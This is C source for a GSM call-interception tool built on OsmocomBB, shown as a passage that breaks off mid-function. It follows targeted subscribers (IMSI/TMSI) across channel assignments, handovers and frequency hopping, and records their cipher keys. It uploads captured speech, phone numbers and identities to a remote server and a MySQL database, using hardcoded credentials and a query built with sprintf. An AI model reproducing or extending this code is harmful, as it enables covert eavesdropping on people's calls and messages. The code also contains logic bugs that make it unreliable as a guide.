/* CCCH passive sniffer */
/* (C) 2010-2011 by Holger Hans Peter Freyther
 * (C) 2010 by Harald Welte <laforge@gnumonks.org>
 *
 * All Rights Reserved
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 *
 */

#include <stdint.h>
#include <errno.h>
#include <stdio.h>
#include <mysql/mysql.h>

#include <osmocom/core/msgb.h>
#include <osmocom/gsm/rsl.h>
#include <osmocom/gsm/tlv.h>
#include <osmocom/gsm/gsm48_ie.h>
#include <osmocom/gsm/gsm48.h>
#include <osmocom/core/signal.h>
#include <osmocom/gsm/protocol/gsm_04_08.h>
#include <osmocom/bb/misc/gsm48_rr.h>

#include <osmocom/bb/common/logging.h>
#include <osmocom/bb/misc/rslms.h>
#include <osmocom/bb/misc/layer3.h>
#include <osmocom/bb/common/osmocom_data.h>
#include <osmocom/bb/common/l1ctl.h>
#include <osmocom/bb/common/l23_app.h>

#include <l1ctl_proto.h>
/* Decode burst */
#include <osmocom/bb/misc/xcch.h>
/* Connect to server */
#include <osmocom/bb/common/https-client.h>
/* Load file config */
#include <osmocom/bb/common/conf.h>

enum dch_state_t {
	DCH_SDCCH,
	DCH_WAIT_KC,
	DCH_TCH,
};

extern int ccch_quit;
uint8_t is_offline_mode;
uint32_t id_rebuild_jump_event;

extern struct gsmtap_inst *gsmtap_inst;
extern int quit;

extern int is_send_request;

/* Global vars */
static struct {
	uint8_t need_push_event;
	uint16_t arfcn;
	uint32_t index_round;

	int ccch_mode;
	int has_si1;
	int has_si3;
	int has_si5;
	int has_si6;
	int has_si5ter;
	int has_kc;
	int has_cipher_cmd;

	int has_CMrequest_pagingrespone;
	int has_jump_channel;

	uint8_t Call_Flow;
	int neci;
	uint16_t cell_id;
	uint16_t lac_id;
	uint8_t dch_nr;
	uint8_t dch_ciph;
	uint32_t last_fn;

	int dch_badcnt;

	enum dch_state_t dch_state;

	struct gsm_sysinfo_freq cell_arfcns[1024];
	sbit_t bursts_dl[116 * 4];
	sbit_t bursts_ul[116 * 4];
	sbit_t mI_dl[8][116];
	sbit_t mI_ul[8][116];

	char phonenumber[MAX_PHONE_NUMBER_LEN];

	uint8_t kc[8];
	char kc_str[GSM_KC_LEN * 10];
	/* Cipher data */
	uint32_t cipher_index;
	struct l1ctl_burst_ind *cipher_buffer;
	sbit_t bursts_dl_cipherbuffer[116 * 4];
	sbit_t bursts_ul_cipherbuffer[116 * 4];

	uint8_t speed_mode;

	/* Send request to server */
	EV_HTTP_DATA http_data;

	/* Target tmsi */
	IMSI_TMSI local_addr;
	uint8_t local_addr_str[MAX_IMSI_TMSI_LEN * 2 + 1];
	uint8_t match_imsi_tmsi;

	/* Capture setting */
	uint8_t is_catch_voice;
	uint8_t is_catch_sms;

	/* Si5 */
	uint8_t SI5[23];

	/* Si6 */
	uint8_t SI6[23];

	/* Si5ter */
	uint8_t SI5ter[23];

	uint8_t AssignCMDBuffer[100];
	uint8_t AssignCMD_readyState;
	int rxAssignCMD_cnt;
	int AssignCMDBufIndex;
	uint8_t AssignCMD_NR;
	uint8_t AssignCMD_NS;
	uint32_t AssignFn;

	uint8_t CCSetupBuffer[100];
	uint8_t CCSetup_readyState;
	uint16_t CCSetup_Index;
	uint8_t CCSetup_NR;
	uint8_t CCSetup_NS;

	uint8_t HandoverBuffer[100];
	uint8_t Handover_readyState;
	uint16_t Handover_Index;
	uint8_t Handover_NR;
	uint8_t Handover_NS;
	uint32_t HandoverFn;

	struct osmocom_ms *ms;

	/* Assignment CMD */
	struct gsm48_ass_cmd ac;
	uint8_t ac_arfcns_ma_length;
	uint16_t ac_arfcns_ma[64];

	struct {
		uint16_t arfcn;
		uint16_t ma[64];
		uint8_t ma_len;
		struct gsm48_chan_desc chan_desc;
		uint8_t status;
		uint8_t resync_count;
		uint8_t speed_mode;
		uint8_t req_ref;
	} handover_mess;

	uint8_t is_call_release;

	struct {
		uint16_t bcch_arfcn;
		struct gsm48_chan_desc chan_desc;
		uint16_t ma[64];
		uint8_t ma_len;
		uint8_t req_ref;
		uint16_t old_bcch_arfcn;
		uint32_t fn;
	} resync_message;

} app_state;

uint32_t d_h;
FILE *fp = NULL;

uint8_t d_target;
uint8_t d_target_list[41][9];
char *b64_sdcch_buff = NULL;
uint8_t watch_dog = 0;

static int insert_jump_event(uint16_t old_bcch_arfcn, uint16_t target_bcch_arfcn, uint16_t* ma, uint8_t ma_len, struct gsm48_chan_desc * chan_desc, uint8_t type);

int set_cell_lac_info(uint16_t cell_id, uint32_t lac_id){
	app_state.cell_id = cell_id;
	app_state.lac_id = lac_id;
	LOGP(DRR, LOGL_INFO, "Scan_tch receive new cell id: %u, lac id : %u\n", app_state.cell_id, app_state.lac_id);
	return 0;
}

static int insert_rebuild_jump_event() {
	MYSQL *con = mysql_init(NULL);
	char query[1000] = {0};

	if (con == NULL) {
		fprintf(stderr, "Init con false: %s\n", mysql_error(con));
		exit(1);
	}

	if (mysql_real_connect(con, DATABASE_HOSTNAME, "netsharing", "12345678", "app_state", 0, NULL, 0) == NULL) {
	      finish_with_error(con);
	}

    sprintf(query, "INSERT INTO `rebuild_jump_event`(`Id_http`, `Source_c0`, `Source_fn`, `Kc`, `State_process`, `Voice_mode`, `Local_addr`, `Remote_addr`, `Index_round`) VALUES (\"%s\", \"%u_%u_%u\", %u, \"%s\", 1, %u, \"%s\", \"%s\", %lu)", app_state.http_data.id, app_state.arfcn, app_state.cell_id, app_state.lac_id, app_state.last_fn, app_state.kc_str, app_state.speed_mode, app_state.local_addr_str, app_state.phonenumber, app_state.index_round);
	if (mysql_query(con, query)) {
		finish_with_error(con);
	}
	mysql_close(con);
	return 1;
}

static int bcch_check_tc(uint8_t si_type, uint8_t tc) {
	/* FIXME: there is no tc information (always 0) */
	return 0;

	switch (si_type) {
	case GSM48_MT_RR_SYSINFO_1:
		if (tc != 0)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_2:
		if (tc != 1)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_3:
		if (tc != 2 && tc != 6)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_4:
		if (tc != 3 && tc != 7)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_7:
		if (tc != 7)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_8:
		if (tc != 3)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_9:
		if (tc != 4)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_13:
		if (tc != 4 && tc != 0)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_16:
		if (tc != 6)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_17:
		if (tc != 2)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_2bis:
		if (tc != 5)
			return -EINVAL;
		break;
	case GSM48_MT_RR_SYSINFO_2ter:
		if (tc != 5 && tc != 4)
			return -EINVAL;
		break;

	/* The following types are used on SACCH only */
	case GSM48_MT_RR_SYSINFO_5:
	case GSM48_MT_RR_SYSINFO_6:
	case GSM48_MT_RR_SYSINFO_5bis:
	case GSM48_MT_RR_SYSINFO_5ter:
		break;

	/* Unknown SI type */
	default:
		LOGP(DRR, LOGL_INFO, "Unknown SI (type=0x%02x)\n", si_type);
		return -ENOTSUP;
	};

	return 0;
}

static void dump_bcch(struct osmocom_ms *ms, uint8_t tc, const uint8_t *data) {
	struct gsm48_system_information_type_header *si_hdr;
	si_hdr = (struct gsm48_system_information_type_header *) data;
	uint8_t si_type = si_hdr->system_information;

	if (bcch_check_tc(si_type, tc) == -EINVAL)
		LOGP(DRR, LOGL_INFO, "SI on wrong tc=%u\n", tc);

	/* GSM 05.02 §6.3.1.3 Mapping of BCCH data */
	switch (si_type) {
	case GSM48_MT_RR_SYSINFO_1:
		/* No need handle */
		break;
	case GSM48_MT_RR_SYSINFO_3:
		/* No need handle */
		break;

	default:
		/* We don't care about other types of SI */
		break; /* thus there is nothing to do */
	};
}

static void jump_to_tch_channel(struct osmocom_ms *ms, struct gsm48_chan_desc * chan_desc, uint16_t * ma, uint8_t ma_len, uint16_t bcch_arfcn, uint16_t old_bcch_arfcn, uint16_t cell_id, uint16_t lac_id, uint32_t fn){
	uint8_t ch_type, ch_subch, ch_ts;

	if (is_offline_mode && app_state.need_push_event == 1) {
		LOGP(DRR, LOGL_NOTICE, "Offline mode, send info jump channel to database\n");
		insert_jump_event(app_state.resync_message.old_bcch_arfcn, app_state.resync_message.bcch_arfcn, app_state.resync_message.ma, app_state.resync_message.ma_len, &app_state.resync_message.chan_desc, 2);
		ccch_quit = 2;
		return;
	}

	/* Reset badcnt */
	app_state.dch_badcnt = 0;

	/* Jump channel */
	rsl_dec_chan_nr(chan_desc->chan_nr, &ch_type, &ch_subch, &ch_ts);
	if (!chan_desc->h0.h) {
		uint16_t arfcn;

		arfcn = chan_desc->h0.arfcn_low | (chan_desc->h0.arfcn_high << 8);
		LOGP(DRR, LOGL_NOTICE, "ASS CMD(chan_nr=0x%02x, "
				"ARFCN=%u, TS=%u, SS=%u, TSC=%u) \n", chan_desc->chan_nr, arfcn,
				ch_ts, ch_subch, chan_desc->h0.tsc);

		l1ctl_tx_hopping_args(ms, bcch_arfcn, old_bcch_arfcn, 0, 0, chan_desc->h0.tsc,
				chan_desc->chan_nr, fn, ch_ts, ma_len, ma, cell_id, lac_id, app_state.index_round);
		l1ctl_tx_dm_est_req_h1(ms, 0, 0, ma, ma_len, chan_desc->chan_nr,
				chan_desc->h1.tsc, GSM48_CMODE_SPEECH_EFR, 0);
	} else { 
		uint8_t maio, hsn;

		hsn = chan_desc->h1.hsn;
		maio = chan_desc->h1.maio_low | (chan_desc->h1.maio_high << 2);
		LOGP(DRR, LOGL_NOTICE,
				"local_burst_decode ASS CMD -- HOPPING ( chan_nr=0x%02x, "
						"HSN=%u, MAIO=%u, TS=%u, SS=%u, TSC=%u) \n",
				chan_desc->chan_nr, hsn, maio, ch_ts, ch_subch,
				chan_desc->h1.tsc);
		l1ctl_tx_hopping_args(ms, bcch_arfcn, old_bcch_arfcn, maio, hsn, chan_desc->h1.tsc,
				chan_desc->chan_nr, fn, ch_ts, ma_len, ma, cell_id, lac_id, app_state.index_round);
		l1ctl_tx_dm_est_req_h1(ms, maio, hsn, ma, ma_len, chan_desc->chan_nr,
				chan_desc->h1.tsc, GSM48_CMODE_SPEECH_EFR, 0);
	}
}

static int parser_ass_command(struct osmocom_ms *ms) {
	uint8_t voice_mode;
	uint8_t start_mode;
	uint8_t codec_rate;
	int parser_result;
	int i;

	if (app_state.AssignCMD_readyState == 2) {
		struct gsm48_ass_cmd *ac;

		ac = (struct gsm48_ass_cmd *) &(app_state.AssignCMDBuffer[2]);
		LOGP(DCC, LOGL_NOTICE, "Assignment command, ia, chan_nr = 0x%02x, ia->chan_desc.h0 = %d \n",
				ac->chan_desc.chan_nr, ac->chan_desc.h0);
		memcpy(&app_state.ac, ac, sizeof(struct gsm48_ass_cmd));

		parser_result = gsm48_rr_rx_ass_cmd_parser(ms,
				app_state.AssignCMDBuffer, app_state.AssignCMDBufIndex,
				app_state.ac_arfcns_ma, &app_state.ac_arfcns_ma_length,
				&voice_mode, &app_state.http_data.speech.mulrate_conf);
				
		app_state.AssignCMDBufIndex = 0;
		if (parser_result != 0) {
			LOGP(DCC, LOGL_NOTICE, "Assignment command parser is failed\n");
			return;
		}

		app_state.has_jump_channel = 1;
		if (app_state.ac_arfcns_ma_length == 0){
			LOGP(DCC, LOGL_NOTICE, "NO HOPPING ----- arfcn: %d\n", app_state.ac.chan_desc.h0.arfcn_low | app_state.ac.chan_desc.h0.arfcn_high << 8);
			app_state.ac_arfcns_ma_length = 1;
			app_state.ac_arfcns_ma[0] = app_state.ac.chan_desc.h0.arfcn_low | app_state.ac.chan_desc.h0.arfcn_high << 8;
		}
		else
		{
			uint8_t maio, hsn;

			maio = ac->chan_desc.h1.maio_low | (ac->chan_desc.h1.maio_high << 2);
			hsn = ac->chan_desc.h1.hsn;
			LOGP(DCC, LOGL_NOTICE, "HOPPING\n");
		}
		app_state.speed_mode = voice_mode;
		app_state.http_data.speech.speed_mode = app_state.speed_mode;
		LOGP(DCC, LOGL_NOTICE, "The speed version is %x.\n", (app_state.speed_mode == GSM48_CMODE_SPEECH_EFR) ? "EFR" : ((app_state.speed_mode == GSM48_CMODE_SPEECH_AMR) ? "AMR" : "Unknow ???"));
		LOGP(DCC, LOGL_NOTICE, "The start mode is %x.\n", start_mode);
		LOGP(DCC, LOGL_NOTICE, "The codec rate is %x.\n", codec_rate);

		/* Set resync message */
		memset(&app_state.resync_message, 0, sizeof(app_state.resync_message));
		app_state.resync_message.bcch_arfcn = app_state.arfcn;
		app_state.resync_message.ma_len = app_state.ac_arfcns_ma_length;
		app_state.resync_message.fn = app_state.AssignFn;
		memcpy(app_state.resync_message.ma, app_state.ac_arfcns_ma, 64 * sizeof(app_state.resync_message.ma[0]));
		memcpy(&app_state.resync_message.chan_desc,	&app_state.ac.chan_desc, sizeof(app_state.handover_mess.chan_desc));

	} else if (app_state.Handover_readyState == 2) {
		if (gsm48_rr_rx_hando_cmd_parser(ms, app_state.HandoverBuffer, app_state.Handover_Index, &app_state.handover_mess.arfcn,
			&app_state.handover_mess.ma, &app_state.handover_mess.ma_len,
			&app_state.handover_mess.chan_desc, &voice_mode) == 0) {
				LOGP(DSS, LOGL_DEBUG, "Receive handover message\n");
				app_state.has_jump_channel = 2;

				/* Set voice mode */
				app_state.speed_mode = voice_mode;
				app_state.http_data.speech.speed_mode = app_state.speed_mode;

				if (app_state.speed_mode == -1)
					app_state.speed_mode = 0;
				
				if ((app_state.handover_mess.chan_desc.chan_nr / 8) < 4) {
					app_state.handover_mess.status = 1;
					LOGP(DSS, LOGL_DEBUG, "Handover Resync to arfcn %d\n", app_state.handover_mess.arfcn);
					/* Set resync message */
					memset(&app_state.resync_message, 0, sizeof(app_state.resync_message));
					app_state.resync_message.old_bcch_arfcn = app_state.arfcn;
					app_state.resync_message.bcch_arfcn = app_state.handover_mess.arfcn;
						
					if (app_state.handover_mess.ma_len == 0) {
						/* Handover no hopping */
						app_state.resync_message.ma_len = 1;
						app_state.resync_message.ma[0] = app_state.resync_message.bcch_arfcn;
					} else {
						/* Handover hopping */
						app_state.resync_message.ma_len = app_state.handover_mess.ma_len;
						memcpy(app_state.resync_message.ma, app_state.handover_mess.ma, 64 * sizeof(app_state.resync_message.ma[0]));
					}
					app_state.resync_message.fn = app_state.HandoverFn;
					memcpy(&app_state.resync_message.chan_desc,	&app_state.handover_mess.chan_desc, sizeof(app_state.handover_mess.chan_desc));
				}
				LOGP(DSS, LOGL_NOTICE, "The voice mode is %s.\n", (voice_mode == GSM48_CMODE_SPEECH_EFR) ? "EFR" : ((voice_mode == GSM48_CMODE_SPEECH_AMR) ? "AMR" : "Unknow ???"));

		} else {
			LOGP(DSS, LOGL_DEBUG, "Decode Handover message is falsed, Release channel\n");
			if (voice_mode == -1)
				voice_mode = 0;
			if ((app_state.handover_mess.chan_desc.chan_nr / 8) < 4) {
				/* TODO Parser args handover */
			} else {
				LOGP(DCC, LOGL_DEBUG, "Ignore Handover in case \"SDCCH with ciphered\"\n");
			}
		}
	}
}

void process_facch_message(struct osmocom_ms *ms, uint8_t *l2_data, uint8_t ul, uint32_t fn) {
	int i;
	char _buff[300];
	memset(_buff, 0, 300);

	if (ccch_quit == 1){
		return;
	}

	for (i = 0; i < 23; i++) {
		char mbuff[10];
		memset(mbuff, 0, 10);
		snprintf(mbuff, 10, "%02x \0", l2_data[i]);
		strcat(_buff, mbuff);
	}
	LOGP(DSS, LOGL_DEBUG, "%s %s %s\n ", ul ? "uplink" : "downlink", "facch: ", _buff);

	if (ul) {
		if ((l2_data[0] & 0x01) && ((l2_data[3] & 0x0f) == 0x03)
				&& ((l2_data[4] & 0x3f) == 0x2d)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG, "Released by uplink-------------------\n");
		}
		if ((l2_data[0] & 0x01) && (l2_data[1] == 0x53)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG,
					"Released by uplink - DISC -------------------\n");
		}
		if (((l2_data[3] & 0x0f) == 0x3) && ((l2_data[4] & 0x3f) == 0x25)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG,
					"Released by uplink - Disconnect-------------------\n");
		}
		if (((l2_data[3] & 0x0f) == 0x03) && ((l2_data[4] & 0x3f) == 0x2a)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG,
					"Released by uplink - Release Completed-------------------\n");
		}
	} else {
		if (((l2_data[3] & 0x0f) == 0x6) && (l2_data[4] == 0x0d)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG, "Released by Downlink-------------------\n");
		}
		if (((l2_data[3] & 0x0f) == 0x3) && ((l2_data[4] & 0x3f) == 0x25)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG,
					"Released by Downlink - Disconnect-------------------\n");
		}
		if ((l2_data[0] & 0x01) && ((l2_data[3] & 0x0f) == 0x03)
				&& ((l2_data[4] & 0x3f) == 0x2d)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG, "Released by Downlink -------------------\n");
		}
		if (((l2_data[3] & 0x0f) == 0x03) && ((l2_data[4] & 0x3f) == 0x2a)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG,
					"Released by Downlink - Release Completed-------------------\n");
		}
		if ((l2_data[0] & 0x01) && (l2_data[1] == 0x53)) {
			app_state.is_call_release = 1;
			LOGP(DSS, LOGL_DEBUG,
					"Released by Downlink - DISC -------------------\n");
		}
	}

	/* Concat handover */
	if ((app_state.Handover_NR == (l2_data[1] >> 5))
					&& (app_state.Handover_NS < ((l2_data[1] >> 1) & 0x07))
					&& app_state.Handover_readyState == 1) {
		// update NS
		app_state.Handover_NS = ((l2_data[1] >> 1) & 0x07);
		// lay data
		if ((l2_data[2] >> 1) & 0x01) {
			/* Moresegment */
			memcpy(&(app_state.HandoverBuffer[app_state.Handover_Index]), &(l2_data[3]), (l2_data[2] >> 2) & 0x3F);
			app_state.Handover_readyState = 1;
			app_state.Handover_Index += (l2_data[2] >> 2) & 0x3F;

		} else {
			/* last,segment */
			memcpy(&(app_state.HandoverBuffer[app_state.Handover_Index]), &(l2_data[3]), (l2_data[2] >> 2) & 0x3F);
			app_state.Handover_readyState = 2;
			app_state.HandoverFn = fn;
			app_state.Handover_Index += (l2_data[2] >> 2) & 0x3F;
		}
	}

	if ((app_state.Handover_readyState == 0) && ((l2_data[0] == 0x03)) && ((l2_data[3] & 0x0F) == 0x06) && (l2_data[4] == 0x2b)) { /* Finish concat handover */
		app_state.Handover_NR = l2_data[1] >> 5;
		app_state.Handover_NS = ((l2_data[1] >> 1) & 0x07);
		memset(app_state.HandoverBuffer, 0,
				sizeof(app_state.HandoverBuffer));
		if ((l2_data[2] >> 1) & 0x01) {
			/* Moresegment */
			app_state.Handover_Index += (l2_data[2] >> 2) & 0x3F;
			memcpy(app_state.HandoverBuffer, &(l2_data[3]), (l2_data[2] >> 2) & 0x3F);
			app_state.Handover_readyState = 1;

		} else {
			/* Last segment */
			memcpy(app_state.HandoverBuffer, &(l2_data[3]), (l2_data[2] >> 2) & 0x3F);
			app_state.Handover_readyState = 2;
			app_state.HandoverFn = fn;
			app_state.Handover_Index += (l2_data[2] >> 2) & 0x3F;
		}
	}

	/* Process Handover */
	if (app_state.Handover_readyState == 2) {
		LOGP(DSS, LOGL_DEBUG, "Receive handover message\n");
		memset(&app_state.handover_mess, 0, sizeof(app_state.handover_mess));
		if (gsm48_rr_rx_hando_cmd_parser(ms, app_state.HandoverBuffer,
				app_state.Handover_Index, &app_state.handover_mess.arfcn,
				&app_state.handover_mess.ma,
				&app_state.handover_mess.ma_len,
				&app_state.handover_mess.chan_desc,
				&app_state.handover_mess.speed_mode) == 0) {

			LOGP(DSS, LOGL_NOTICE, "The voice mode is %s.\n", (app_state.handover_mess.speed_mode == GSM48_CMODE_SPEECH_EFR) ? "EFR" : ((app_state.handover_mess.speed_mode == GSM48_CMODE_SPEECH_AMR) ? "AMR" : "Unknow ???"));

			struct gsm48_hdr *gh = (void*) app_state.HandoverBuffer;
			struct gsm48_ho_cmd *ho = (struct gsm48_ho_cmd *) gh->data;
			if (app_state.handover_mess.speed_mode = -1)
				app_state.handover_mess.speed_mode = app_state.speed_mode;
			app_state.handover_mess.req_ref = ho->ho_ref;

			if ((app_state.handover_mess.req_ref!= app_state.resync_message.req_ref)
					|| (memcmp(&app_state.resync_message.chan_desc,&app_state.handover_mess.chan_desc,sizeof(app_state.resync_message.chan_desc)) != 0)
					|| app_state.handover_mess.arfcn != app_state.resync_message.bcch_arfcn) {

				app_state.has_jump_channel = 2;
				/* Set resync message */
				memset(&app_state.resync_message, 0, sizeof(app_state.resync_message));
				app_state.resync_message.old_bcch_arfcn = app_state.arfcn;
				app_state.resync_message.bcch_arfcn = app_state.handover_mess.arfcn;
				
				if (app_state.handover_mess.ma_len == 0) {
					/* Handover no hopping */
					app_state.resync_message.ma_len = 1;
					app_state.resync_message.ma[0] = app_state.resync_message.bcch_arfcn;
				} else {
					/* Handover hopping */
					app_state.resync_message.ma_len = app_state.handover_mess.ma_len;
					memcpy(app_state.resync_message.ma, app_state.handover_mess.ma, 64 * sizeof(app_state.resync_message.ma[0]));
				}
				app_state.resync_message.fn = app_state.HandoverFn;
				memcpy(&app_state.resync_message.chan_desc,	&app_state.handover_mess.chan_desc, sizeof(app_state.handover_mess.chan_desc));

				/* Send http_data before jump*/
				LOGP(DRR, LOGL_NOTICE, "Send http_data before handover \n");
				app_state.http_data.arfcn = app_state.arfcn;
				app_state.http_data.cell_id = app_state.cell_id;
				app_state.http_data.lac = app_state.lac_id;
				app_state.http_data.type = GSM_TYPE_SPEECH;
				os_http_clear_buffer(app_state.http_data.speech.remote_addr);
				evbuffer_add_printf(app_state.http_data.speech.remote_addr, "%s", app_state.phonenumber);
				os_http_clear_buffer(app_state.http_data.speech.local_addr);
				evbuffer_add_printf(app_state.http_data.speech.local_addr, "%s", app_state.local_addr_str);
				app_state.http_data.speech.dch_ciph = app_state.dch_ciph;
				app_state.http_data.cell_id = app_state.cell_id;
				app_state.http_data.lac = app_state.lac_id;
				app_state.http_data.speech.speed_mode = app_state.speed_mode;
				app_state.http_data.speech.is_end_part = 0;

				for (i = 0; i < sys.workers[sys.id].http_retries; i++) {
					if (os_http_client_sendreq(&app_state.http_data) == 0) {
						os_http_clear_buffer(app_state.http_data.speech.speech_data);
						app_state.http_data.speech.last_send_time = time(NULL);
						app_state.http_data.speech.current_part++;
						break;
					}
				}
				app_state.dch_nr = app_state.resync_message.chan_desc.chan_nr;

				/* Jump to new channel */
				jump_to_tch_channel(ms, &app_state.resync_message.chan_desc, app_state.resync_message.ma, app_state.resync_message.ma_len, app_state.resync_message.bcch_arfcn, app_state.resync_message.old_bcch_arfcn, app_state.cell_id, app_state.lac_id, app_state.resync_message.fn);
				app_state.arfcn = app_state.resync_message.bcch_arfcn;
			}
		} else {
			LOGP(DSS, LOGL_DEBUG, "Decode Handover message is failed, Release channel\n");
			app_state.is_call_release = 1;
		}
		/* Clear to receive next message */
		app_state.Handover_readyState = 0;
		app_state.Handover_Index = 0;
		app_state.Handover_NR = 0;
	}
	
	/* Concat Assignment cmd */
	if ((ul == 0) && (app_state.AssignCMD_readyState == 1)
			&& (app_state.AssignCMD_NS < ((l2_data[1] >> 1) & 0x07))
			&& (app_state.AssignCMD_NR == (l2_data[1] >> 5))) {
		// update NS
		app_state.AssignCMD_NS = ((l2_data[1] >> 1) & 0x07);
		// lay data
		if ((l2_data[2] >> 1) & 0x01) {
			/* Moresegment */
			memcpy(&(app_state.AssignCMDBuffer[app_state.AssignCMDBufIndex]), &(l2_data[3]), 20);
			app_state.AssignCMD_readyState = 1;
			app_state.AssignCMDBufIndex += 20;
		} else {
			/* Last segment */
			memcpy(&(app_state.AssignCMDBuffer[app_state.AssignCMDBufIndex]), &(l2_data[3]), (l2_data[2] >> 2) & 0x3F);
			app_state.AssignCMD_readyState = 2;
			app_state.AssignFn = fn;
			app_state.AssignCMDBufIndex += (l2_data[2] >> 2) & 0x3F;
		}
	}
	
	/* Finish concat Assignment cmd */
	if ((l2_data[0] == 0x03) && ((l2_data[3] & 0x0f) == 0x06) && (l2_data[4] == 0x2e) && (ul == 0) 
			&& (app_state.rxAssignCMD_cnt == 0) && (app_state.AssignCMD_readyState == 0)) {
		app_state.rxAssignCMD_cnt++;
		app_state.AssignCMD_NR = l2_data[1] >> 5;
		app_state.AssignCMD_NS = ((l2_data[1] >> 1) & 0x07);
		memset(app_state.AssignCMDBuffer, 0, sizeof(app_state.AssignCMDBuffer));
		if ((l2_data[2] >> 1) & 0x01) {
			/* Moresegment */
			app_state.AssignCMDBufIndex = 20;
			memcpy(app_state.AssignCMDBuffer, &(l2_data[3]), 20);
			app_state.AssignCMD_readyState = 1;
		} else {
			/* Last segment */
			memcpy(app_state.AssignCMDBuffer, &(l2_data[3]), (l2_data[2] >> 2) & 0x3F);
			app_state.AssignCMD_readyState = 2;
			app_state.AssignFn = fn;
			app_state.AssignCMDBufIndex += (l2_data[2] >> 2) & 0x3F;
		}

	}

	/* Process Assignment cmd */
	if (app_state.AssignCMD_readyState == 2) {
		int parser_result;
		uint8_t voice_mode;
		uint8_t start_mode;
		uint8_t codec_rate;
		struct gsm48_ass_cmd *ac;

		ac = (struct gsm48_ass_cmd *) &(app_state.AssignCMDBuffer[2]);
		LOGP(DCC, LOGL_NOTICE, "Assignment command, ia, chan_nr = 0x%02x, ia->chan_desc.h0 = %d \n",
				ac->chan_desc.chan_nr, ac->chan_desc.h0);
		memcpy(&app_state.ac, ac, sizeof(struct gsm48_ass_cmd));

		parser_result = gsm48_rr_rx_ass_cmd_parser(ms,
				app_state.AssignCMDBuffer, app_state.AssignCMDBufIndex,
				app_state.ac_arfcns_ma, &app_state.ac_arfcns_ma_length,
				&voice_mode, &app_state.http_data.speech.mulrate_conf);
				
		app_state.AssignCMDBufIndex = 0;
		if (parser_result != 0) {
			LOGP(DCC, LOGL_NOTICE, "Assignment command parser is failed\n");
			app_state.is_call_release = 1;
			return;
		}

		app_state.has_jump_channel = 1;
		if (app_state.ac_arfcns_ma_length == 0){
			LOGP(DCC, LOGL_NOTICE, "NO HOPPING ----- arfcn: %d\n", app_state.ac.chan_desc.h0.arfcn_low | app_state.ac.chan_desc.h0.arfcn_high << 8);
			app_state.ac_arfcns_ma_length = 1;
			app_state.ac_arfcns_ma[0] = app_state.ac.chan_desc.h0.arfcn_low | app_state.ac.chan_desc.h0.arfcn_high << 8;
		}
		else
		{
			uint8_t maio, hsn;

			maio = ac->chan_desc.h1.maio_low | (ac->chan_desc.h1.maio_high << 2);
			hsn = ac->chan_desc.h1.hsn;
			LOGP(DCC, LOGL_NOTICE, "HOPPING\n");
		}
		app_state.speed_mode = voice_mode;
		LOGP(DCC, LOGL_NOTICE, "The speed version is %x.\n", (app_state.speed_mode == GSM48_CMODE_SPEECH_EFR) ? "EFR" : ((app_state.speed_mode == GSM48_CMODE_SPEECH_AMR) ? "AMR" : "Unknow ???"));
		LOGP(DCC, LOGL_NOTICE, "The start mode is %x.\n", start_mode);
		LOGP(DCC, LOGL_NOTICE, "The codec rate is %x.\n", codec_rate);

		/* Set resync message */
		memset(&app_state.resync_message, 0, sizeof(app_state.resync_message));
		app_state.resync_message.old_bcch_arfcn = app_state.arfcn;
		app_state.resync_message.bcch_arfcn = app_state.arfcn;
		app_state.resync_message.ma_len = app_state.ac_arfcns_ma_length;
		app_state.resync_message.fn = app_state.AssignFn;
		memcpy(app_state.resync_message.ma, app_state.ac_arfcns_ma, 64 * sizeof(app_state.resync_message.ma[0]));
		memcpy(&app_state.resync_message.chan_desc,	&app_state.ac.chan_desc, sizeof(app_state.handover_mess.chan_desc));

		/* Send http_data before jump*/
		LOGP(DRR, LOGL_NOTICE, "Send http_data before Assignment cmd \n");
		app_state.http_data.arfcn = app_state.arfcn;
		app_state.http_data.cell_id = app_state.cell_id;
		app_state.http_data.lac = app_state.lac_id;
		app_state.http_data.type = GSM_TYPE_SPEECH;
		os_http_clear_buffer(app_state.http_data.speech.remote_addr);
		evbuffer_add_printf(app_state.http_data.speech.remote_addr, "%s", app_state.phonenumber);
		os_http_clear_buffer(app_state.http_data.speech.local_addr);
		evbuffer_add_printf(app_state.http_data.speech.local_addr, "%s", app_state.local_addr_str);
		app_state.http_data.speech.dch_ciph = app_state.dch_ciph;
		app_state.http_data.cell_id = app_state.cell_id;
		app_state.http_data.lac = app_state.lac_id;
		app_state.http_data.speech.speed_mode = app_state.speed_mode;
		app_state.http_data.speech.is_end_part = 0;

		for (i = 0; i < sys.workers[sys.id].http_retries; i++) {
			if (os_http_client_sendreq(&app_state.http_data) == 0) {
				os_http_clear_buffer(app_state.http_data.speech.speech_data);
				app_state.http_data.speech.last_send_time = time(NULL);
				app_state.http_data.speech.current_part++;
				break;
			}
		}

		app_state.dch_nr = app_state.resync_message.chan_desc.chan_nr;

		/* Jump to new channel */
